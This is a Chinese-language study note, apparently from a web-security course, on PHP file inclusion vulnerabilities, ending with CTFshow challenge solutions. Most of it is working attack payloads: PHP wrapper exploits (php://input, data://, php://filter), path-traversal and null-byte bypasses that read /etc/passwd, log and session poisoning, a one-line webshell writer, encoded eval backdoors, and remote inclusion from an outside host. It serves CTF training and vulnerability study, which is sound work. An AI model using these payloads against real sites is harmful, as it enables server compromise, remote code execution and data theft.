
---

➢ 文件包含-原理&分类&利用&修复

➢ 黑盒利用-VULWEB-有无包含文件

➢ 白盒利用-CTFSHOW-伪协议玩法
好文章#https://fanygit.github.io/2021/10/23/CTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/

#文件包含-原理 
分类&利用&修复
1、原理

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。
在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞。
## php常见文件包含函数

```
include()：遇到错误生成警告，继续执行脚本 

require()：遇到错误生成致命错误，脚本继续  

include_once()：如果文件已包含，则不再进行包含，一定程度避免错误  

require()_once()：如果文件已包含，则不再进行包含，一定程度避免错误  

fopen()，file_get_contents()等：文件读取函数
```


## 分类

==本地==包含-Local File Include-LFI
==远程==包含-Remote File Include-RFI
差异原因：==代码过滤==和==环境配置==文件开关**决定

![[image2 1.jpg]]

文件包含常用函数
- PHP：include、require、include_once、require_once等
	- include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行
	- require函数出现错误的时候，会直接报错并退出程序的执行

- Java：java.io.File、java.io.FileReader等
- ASP.NET：System.IO.FileStream、System.IO.StreamReader等

### 白盒审计：（CTFSHOW）

-白盒发现：

1、可通过**应用功能**追踪代码,定位审计

2、可通过脚本**特定函数**搜索,定位审计

3、可通过**伪协议**玩法绕过相关修复等

==*PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法*==
参考：#https://blog.csdn.net/unexpectedthing/article/details/121276653

### 黑盒分析：

-黑盒发现：主要观察==参数传递的数据==和==文件名==是否对应

URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼

### 利用思路


#### 本地利用思路：

- 1、配合文件上传
- 2、无文件上传包含日志
- 3、无文件上传包含SESSION
- 4、无文件上传支持伪协议利用

#### 远程利用思路：

直接搭建一个可访问的远程URL包含文件



### php伪协议

##### php://input（allow_url_include=On）

遇到file_get_contents()要想到用php://input绕过
```

构造?file=php://input  
post data中输入：<?php system('dir');?>    //代码表示显示所有文件目录  
根据显示的文件目录直接进行访问（某txt或php文件），得到flag

```

##### php://filter

可以使用的函数：readfile()、file()、file_get_contents()、include()
```
?file=php://filter/read=convert.base64-encode/resource=index.php

伪协议可以套协议绕过正则
php://filter/convert.base64-encode/index/resource=flag.php
```

##### data://

要求allow_url_fopen=On，allow_url_include=On
```
?file=data://text/plain,<?php phpinfo()?>    //执行phpinfo()  

?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=    //将命令进行base64加密，编码为“<?php phpinfo()?> ”的base64编码  

?file=data:text/plain,<?php phpinfo()?>    //去掉双斜杠  
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
	data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

##### zip://
zip:// 可以访问压缩包里面的文件。  
zip://中只能传入**绝对路径**；要用#分隔压缩包和压缩包里的内容，且#要用url编码**%23**代替
```
?file=zip://D:\file.zip%23flag.txt

1. D:\file.zip表示压缩包的绝对路径
2. 后跟%23分割压缩包和压缩包中要访问的文件名
```

##### phar://

类似zip://，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压
脚本在php反序列化中
```
?file=phar://D:\file.zip\flag.txt    //绝对路径  
?file=phar://file.zip\flag.txt    //相对路径
```


### 包含日志文件

```
apache+Linux日志默认路径   
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log 
/etc/httpd/logs/access_log 
/etc/httpd/logs/error_log 
/etc/httpd/logs/error.log
```

```
apache+win2003日志默认路径  
D:\xampp\apache\logs\access.log  
D:\xampp\apache\logs\error.log
```

```
IIS6.0+win2003默认日志文件   
C:\WINDOWS\system32\Logfiles
```

```
IIS7.0+win2003 默认日志文件 %SystemDrive%\inetpub\logs\LogFiles
```

```
nginx 日志文件   
用户安装目录logs目录下（/usr/local/nginx/logs）   
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/var/log/nginx/access.log
/usr/local/nginx/logs
```

```
apache+linux 默认配置文件  
/etc/httpd/conf/httpd.conf  
index.php?page=/etc/init.d/httpd
```

```
IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml
```

```
IIS7.0+WIN 配置文件 C:\Windows\System32\inetsrv\config\applicationHost.config
```

### session常见存储路径

php的session文件的保存路径可以在phpinfo的**session.save_path**看到，  
session文件格式：` sess_[phpsessid] `，phpsessid在发送的请求的 cookie 字段中可以看到

```
/var/lib/php/sess_PHPSESSID  
/var/lib/php/sess_PHPSESSID  
/tmp/sess_PHPSESSID  
/tmp/sessions/sess_PHPSESSID
```

### 包含系统文件

包含 /pros/self/environ

条件
- php以cgi方式运行，这样environ才会保持UA头。
- environ文件存储位置已知，且environ文件可读。
```
proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。
```


### 文件写入：

```
php://filter/write=convert.base64-encode/resource=phpinfo.php

php://input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```


### 绕过

##### 过滤read、resource
```
?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read）  
绕过方式：  
?f=data:text/plain,<?php phpinfo()?>  
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

```
?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php
（正则 /resource=*.jpg/i）
```


##### 过滤 ../

**利用url编码**

```
(1) ../
    %2e%2e%2f
    ..%2f
    %2e%2e/
(2) ..\
    %2e%2e%5c
    ..%5c
    %2e%2e\
```

**二次编码**

```
(1) ../
     %252e%252e%252f
(2) ..\
     %252e%252e%255c
```

**容器/服务器的编码方式**
```
(1)../
     ..%c0%af
     %c0%ae%c0%ae/
        - java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点
(2)..\
     ..%c1%9c
```

### **截断包含**

要求
- php版本小于5.3.4
- magic_quotes_gpc=off

原理
- Windows下目录最大长度为256字节，超出的部分会被丢弃
- Linux下目录最大长度为4096字节，超出的部分会被丢弃。

```php
<?php   
    include(“includes/” . $_GET['file']);   
?>

<?php   
    include(“includes/” . $_GET['file']."htm");   
?>

```

**url绕过**
```
?file=http://localhost:8081/phpinfo.php?  
拼接后：?file=http://localhost:8081/phpinfo.php?.txt
```

**%00截断包含**
```
?p=../hanguo/test.php%00
```

**列目录**
条件：magic_quotes_gpc=off
```
?file=../../../../../../../../../var/www/accounts/%00
```

**路径遍历**
```
?file=../../../../../../../../../var/lib/locate.db
```

**路径截断**
```
?file=../../../../../../../../../etc/passwd/././...超级多./
```

**点号截断（windows下）**
```
?file=../../../../../../../../../etc/passwd……………. …|
```

**利用phar://协议绕过waf检测**

版本要求：php 5.3.0 起  
**利用php伪协议读取php文件内容**
data要求：  
php5.2以后  
allow_url_fopen ：on  
allow_url_include：on

poc
```
利用方法：index.php?file=phar://test.zip/test.txtindex.php?file=phar://test.xxx/test.txt
```


### ctfshow例题

#黑盒利用-VULWEB-有无包含文件

http://testphp.vulnweb.com/showimage.php?file=index.php

#白盒利用-CTFSHOW-伪协议玩法

https://ctf.show/challenges

#### 78关-php&http协议

```
	payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php

	payload: ?file=php://input post:<?php system('tac flag.php');?>

	payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

#### 79关-data&http协议

```
	payload: ?file=data://text/plain,<?=system('tac flag.*');?>

	payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==

	payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

#### 80、81关-日志包含

- 1、利用其他协议,如file,zlib等
- 2、利用日志记录UA特性包含执行

分析需文件名及带有php关键字放弃

故利用日志记录UA信息，UA带入代码

包含：/var/log/nginx/access.log

#### 82-86关-SESSION包含

利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含

1. 自定义session名字
2. 条件竞争访问session文件
3. 触发创建新文件，植入后门

发送session的代码
```
<!DOCTYPE html>
<html>

<body>

<form action="http://xxxx.ctf.show/" method="POST" enctype="multipart/form-data">

<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php                                                     ?>'?>" />

<input type="file" name="file" />

<input type="submit" value="submit" />

</form>

</body>

</html>
```

#### session条件竞争文章
https://www.cnblogs.com/lnterpreter/p/14086164.html
ctf解题思路
https://www.cnblogs.com/echoDetected/p/13976405.html

#### 87关-php://filter/write&加密编码

1、利用base64:
```

	url编码2次：php://filter/write=convert.base64-decode/resource=123.php

	content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
	把content的内容进行base64解码，在放入123.php文件
```

2、利用凯撒13：

```
	url编码2次：php://filter/write=string.rot13/resource=2.php

	content=<?cuc riny($_CBFG[1]);?>
	把content的内容进行凯撒13解码，在放入123.php文件
```

#### 88关-data&base64协议

过滤PHP，各种符号（+，=等等），php代码编码写出无符号base64值

```
	Payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk
```

#### 117关-php://filter/write&新的算法

convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用



```
<?php
$result = iconv("UCS-2LE","UCS-2BE", '<?php eval(POST[a]);?>');

echo "经过一次反转:".$result."\n";

echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);

?>

Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php

contents=?<hp pvela$(P_SO[T]a;)>?
```